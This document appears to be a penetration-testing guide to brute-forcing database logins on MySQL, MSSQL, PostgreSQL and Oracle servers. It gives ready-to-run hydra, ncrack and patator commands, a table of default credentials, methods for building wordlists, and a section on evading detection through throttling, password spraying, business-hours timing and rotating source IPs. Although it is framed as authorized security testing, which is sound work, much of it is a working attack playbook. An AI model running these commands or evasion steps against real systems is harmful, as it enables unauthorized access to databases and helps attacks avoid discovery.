# Database Protocol Brute-Forcing Guide

> Covers brute-forcing database authentication using hydra, ncrack, and patator. Includes tool comparison, password list strategies, protocol-specific considerations, and detection evasion techniques.

## Overview

Database protocol brute-forcing targets the authentication layer of database servers directly. Unlike web application brute-forcing (which goes through HTTP), protocol-level brute-forcing interacts with the database's native authentication mechanism. This approach is faster, more reliable, and bypasses any web-layer protections, but it requires network access to the database port.

The three primary tools for database brute-forcing on Kali Linux are hydra, ncrack, and patator. Each has different strengths: hydra has the broadest protocol coverage, ncrack excels at speed and parallelism across multiple hosts, and patator provides the most granular control over attack parameters.

## Tool Comparison

| Feature | hydra | ncrack | patator |
|---------|-------|--------|---------|
| **Database protocols** | MySQL, PostgreSQL, MSSQL, Oracle | MySQL, MSSQL | MySQL, PostgreSQL, MSSQL, Oracle |
| **Multi-host** | Yes (via -M) | Yes (native) | Per-command |
| **Threading** | Yes (-t flag) | Yes (native) | Yes (-t flag) |
| **Rate limiting** | Yes (-W flag) | Yes (-T timing) | Yes (-x filters) |
| **Resume support** | Yes | Yes | Limited |
| **Custom response parsing** | No | No | Yes (-x ignore/retry) |
| **Best for** | Broad coverage, established | Speed, network ranges | Precision, filtering |

## hydra — Database Protocol Brute-Force

hydra is the most widely used brute-force tool and supports MySQL, PostgreSQL, MSSQL, and Oracle authentication modules.

### MySQL Brute-Force

```bash
# Single user, password list
hydra -l root -P passwords.txt mysql://192.168.1.100

# User list, password list, throttled
hydra -L users.txt -P passwords.txt mysql://192.168.1.100 -t 4 -W 3

# Custom port
hydra -l root -P passwords.txt mysql://192.168.1.100:3307

# Stop on first success
hydra -L users.txt -P passwords.txt -f mysql://192.168.1.100
```

MySQL common usernames to include in wordlists: root, admin, mysql, dba, backup, replication, developer, test, user. Default installations often have root with no password.

### MSSQL Brute-Force

```bash
# SA account brute-force
hydra -l sa -P passwords.txt mssql://192.168.1.100 -t 4

# Multiple accounts
hydra -L users.txt -P passwords.txt mssql://192.168.1.100 -t 4 -W 3
```

MSSQL almost always has an `sa` (system administrator) account. Focus on sa first since it provides full database and OS access via xp_cmdshell. Common weak passwords: empty, sa, password, P@ssw0rd, Password1, Admin123.

### PostgreSQL Brute-Force

```bash
# PostgreSQL default account
hydra -l postgres -P passwords.txt postgres://192.168.1.100 -t 4

# With custom database name
hydra -l dbuser -P passwords.txt postgres://192.168.1.100 -t 4 -s 5432
```

PostgreSQL's default superuser is `postgres`. Common passwords: postgres, password, admin, and the database name itself.

### Oracle Brute-Force

```bash
# Oracle TNS brute-force (requires SID)
hydra -l sys -P passwords.txt oracle://192.168.1.100 -t 2

# Oracle with SID specified
hydra -l sys -P passwords.txt oracle-sid://192.168.1.100/ORCL -t 2
```

Oracle brute-forcing is slower than other databases due to the TNS protocol overhead. Use lower thread counts (-t 2) to avoid connection failures. Always obtain the SID first via odat sidguesser.

## ncrack — High-Speed Network Authentication Cracking

ncrack is designed for high-speed parallel cracking across multiple hosts and services. It is particularly effective for scanning entire network ranges.

```bash
# Single host, single service
ncrack -p 3306 192.168.1.100 -u root -P passwords.txt

# Multiple database services on one host
ncrack -p 3306,1433,5432 192.168.1.100 -u root,sa,postgres -P passwords.txt

# Network range scan
ncrack -p 3306 192.168.1.0/24 -u root -P passwords.txt -T3

# Resume interrupted scan
ncrack --resume /tmp/ncrack_restore
```

ncrack's timing templates (-T0 through -T5) control aggression: -T0 is paranoid (one connection at a time, long delays), -T3 is normal, and -T5 is insane (maximum speed, high detection risk). For database brute-forcing, -T2 or -T3 is recommended to avoid triggering account lockout or rate-limiting defenses.

## patator — Modular Multi-Protocol Brute-Force

patator provides the most control over brute-force parameters, including response filtering, which reduces false positives and wasted attempts.

```bash
# MySQL with response filtering
patator mysql_login host=192.168.1.100 user=FILE0 password=FILE1 \
  0=users.txt 1=passwords.txt -t 4 -x ignore:fgrep='Access denied'

# PostgreSQL
patator pgsql_login host=192.168.1.100 user=FILE0 password=FILE1 \
  0=users.txt 1=passwords.txt -t 4

# MSSQL
patator mssql_login host=192.168.1.100 user=FILE0 password=FILE1 \
  0=users.txt 1=passwords.txt -t 4

# Oracle with SID
patator oracle_login host=192.168.1.100 sid=ORCL user=FILE0 password=FILE1 \
  0=users.txt 1=passwords.txt -t 2

# Password spray (one password, many users)
patator mysql_login host=192.168.1.100 user=FILE0 password=FILE1 \
  0=users.txt 1=single_password.txt -t 1
```

The `-x ignore:fgrep='Access denied'` filter is critical — it tells patator to skip results containing the failure string, reducing noise and making it easier to identify successful logins.

## Password List Strategies

### Database-Specific Defaults

Always test these default credentials before running brute-force:

| Database | Account | Default Password |
|----------|---------|-----------------|
| MySQL | root | (empty) |
| MySQL | root | root |
| MySQL | mysql | mysql |
| MSSQL | sa | (empty) |
| PostgreSQL | postgres | postgres |
| PostgreSQL | postgres | (empty) |
| Oracle | sys | change_on_install |
| Oracle | system | manager |
| Oracle | scott | tiger |
| Redis | (none) | (none) |

### Custom Wordlist Construction

Build targeted wordlists based on the target environment:

1. **Organization keywords** — Company name, product names, department abbreviations combined with common patterns (Company2025!, Company@123, company123)
2. **Database name as password** — Administrators often use the database name or SID as the password
3. **Environment-based** — prod, dev, staging, test combined with years and special characters
4. **Seasonal patterns** — Spring2025, Summer2025, Fall2025, Winter2025 (common in enterprise environments)

## Detection Evasion

Brute-force attacks against databases are detectable through several mechanisms: failed login event logs (MySQL general_log, PostgreSQL pg_stat_activity, MSSQL error log, Oracle audit log), authentication rate spikes, and IDS signatures.

Evasion strategies for authorized testing:

1. **Throttle requests** — Use -W (hydra), -T2 (ncrack), or -t 1 (patator) to slow attempts below detection thresholds
2. **Distribute across time** — Run attacks during business hours when legitimate authentication noise is higher
3. **Password spraying** — Test one common password against all accounts before moving to the next password, reducing per-account failure counts
4. **Source IP rotation** — If multiple source IPs are available, distribute attempts across them
5. **Test during maintenance windows** — Coordinate with the client to test during planned maintenance when detection alerts are expected

## Performance Considerations

Brute-force speed is limited by the database authentication handshake time, not by the attacking machine's compute power. MySQL and PostgreSQL have relatively fast handshakes (50-200 attempts per second per thread on a local network). Oracle TNS has a much slower handshake due to protocol complexity (5-20 attempts per second per thread). MSSQL falls in between.

Thread count should be calibrated to the target's capacity — too many threads cause connection timeouts and false negatives. Start with 4 threads and increase only if the target handles the load without errors. Always verify a few discovered credentials manually to confirm they are genuine and not false positives from connection errors.
